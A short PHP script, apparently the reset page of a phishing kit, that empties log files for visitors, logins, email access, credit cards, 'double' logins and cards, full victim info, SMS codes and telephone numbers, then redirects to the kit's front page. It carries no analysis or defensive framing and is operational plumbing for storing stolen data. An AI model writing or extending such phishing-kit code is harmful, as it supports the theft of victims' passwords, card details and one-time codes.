<?php 
// All Visitors
file_put_contents("result/all.txt", "");
// allowed Visitors
file_put_contents("result/allowed.txt", "");
// Logins
file_put_contents("result/logins.txt", "");
// double Logins
file_put_contents("result/doubleLogins.txt", "");
// // Email Access
file_put_contents("result/emailAccess.txt", "");
// // double Email access
file_put_contents("result/doubleEmailAccess.txt", "");
// // Credit card
file_put_contents("result/credit.txt", "");
// // double Credit card
file_put_contents("result/doubleCredit.txt", "");
// // info
file_put_contents("result/info.txt", "");
file_put_contents("result/FullInfo.txt", "");
file_put_contents("result/sms.txt", "");
file_put_contents("result/telephone.txt", "");
header("Location: ./");exit();
?>